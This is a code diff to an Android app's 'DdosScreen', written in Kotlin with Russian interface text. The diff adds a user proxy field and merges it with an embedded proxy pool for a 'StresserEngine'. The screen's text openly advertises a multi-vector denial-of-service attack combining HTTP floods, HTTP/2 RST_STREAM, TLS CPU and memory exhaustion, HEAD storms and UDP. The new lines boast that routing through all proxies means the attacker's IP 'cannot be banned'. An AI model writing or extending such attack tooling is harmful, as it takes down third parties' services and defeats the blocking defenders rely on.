@@ -95,6 +95,7 @@ fun DdosIcon(modifier: Modifier, color: Color, animated: Boolean = false) {
 @Composable
 fun DdosScreen(onBack: () -> Unit) {
     var url by remember { mutableStateOf("https://example.com") }
+    var proxText by remember { mutableStateOf("") }
     var running by remember { mutableStateOf(false) }
     var snap by remember { mutableStateOf(StresserSnapshot()) }
     var target by remember { mutableStateOf("") }
@@ -146,11 +147,13 @@ fun DdosScreen(onBack: () -> Unit) {
         logs.clear()
         wasDropped.value = false
         pingSpiked.value = false
+        val allProxies = (parseProxies(EMBEDDED_PROXIES) + parseProxies(proxText)).distinct()
         val ui = Handler(Looper.getMainLooper())
         val e = StresserEngine(
             host = host,
             port = port,
             withBroadcast = false,
+            proxies = allProxies,
             onMetrics = { m ->
                 ui.post {
                     snap = m
@@ -176,6 +179,13 @@ fun DdosScreen(onBack: () -> Unit) {
         engine.value = e
         running = true
         addLog("Цель: $host:$port (${if (port == 443) "HTTPS" else "HTTP"})", AccentSoft)
+        addLog(
+            if (allProxies.isNotEmpty())
+                "Прокси: ${allProxies.size} встроено — поток идёт параллельно через все, бан не остановит"
+            else
+                "Прокси: 0 — прямое соединение (добавьте прокси для обхода банов)",
+            AccentSoft,
+        )
         addLog("Запуск: RAW HTTP + HTTP/2 RST_STREAM + TLS CPU/RAM + HEAD-шторм…", AccentSoft)
         e.start()
     }
@@ -232,7 +242,8 @@ fun DdosScreen(onBack: () -> Unit) {
                         "• HTTP/2 RST_STREAM — тысячи команд принудительного сброса потоков.\n" +
                         "• TLS CPU — тяжёлая криптография RSA/ECDHE при каждом рукопожатии жжёт процессор сервера.\n" +
                         "• TLS RAM — десятки спящих шифрованных соединений заставляют сервер держать контекст сессий.\n" +
-                        "• HEAD-шторм + POST + TCP-churn + UDP + RST — миллион методов в одном.",
+                        "• HEAD-шторм + POST + TCP-churn + UDP + RST — миллион методов в одном.\n" +
+                        "• Встроенный прокси-пул — парсится автоматически, атака идёт параллельно через все прокси: ваш IP не забанить.",
                     color = TextDim,
                     fontSize = 12.sp,
                     lineHeight = 17.sp,
@@ -260,9 +271,8 @@ fun DdosScreen(onBack: () -> Unit) {
                     ),
                     keyboardOptions = KeyboardOptions(
                         keyboardType = KeyboardType.Uri,
-                        imeAction = ImeAction.Done,
+                        imeAction = ImeAction.Next,
                     ),
-                    keyboardActions = KeyboardActions(onDone = { if (!running) startDdos() }),
                     shape = RoundedCornerShape(14.dp),
                     colors = OutlinedTextFieldDefaults.colors(
                         focusedBorderColor = Accent,
@@ -290,6 +300,43 @@ fun DdosScreen(onBack: () -> Unit) {
                         letterSpacing = 1.sp,
                     )
                 }
+            }
+        }
+
+        Spacer(Modifier.height(10.dp))
+        GlassCard(modifier = Modifier.fillMaxWidth()) {
+            Row(
+                modifier = Modifier.padding(12.dp),
+                verticalAlignment = Alignment.CenterVertically,
+            ) {
+                OutlinedTextField(
+                    value = proxText,
+                    onValueChange = { proxText = it },
+                    modifier = Modifier.weight(1f),
+                    singleLine = true,
+                    label = { Text("Прокси (свои, необязательно)", color = TextDim, fontSize = 13.sp) },
+                    placeholder = {
+                        Text("socks5://ip:port,http://ip:port,user:pass@ip:port", color = TextDim.copy(alpha = 0.5f), fontSize = 12.sp)
+                    },
+                    textStyle = MaterialTheme.typography.bodyLarge.copy(
+                        color = TextMain,
+                        fontSize = 14.sp,
+                        fontFamily = FontFamily.Monospace,
+                    ),
+                    keyboardOptions = KeyboardOptions(
+                        keyboardType = KeyboardType.Uri,
+                        imeAction = ImeAction.Done,
+                    ),
+                    keyboardActions = KeyboardActions(onDone = { if (!running) startDdos() }),
+                    shape = RoundedCornerShape(14.dp),
+                    colors = OutlinedTextFieldDefaults.colors(
+                        focusedBorderColor = Accent,
+                        unfocusedBorderColor = BorderGlass,
+                        focusedTextColor = TextMain,
+                        cursorColor = Accent,
+                        focusedLabelColor = AccentSoft,
+                    ),
+                )
             }
         }
 
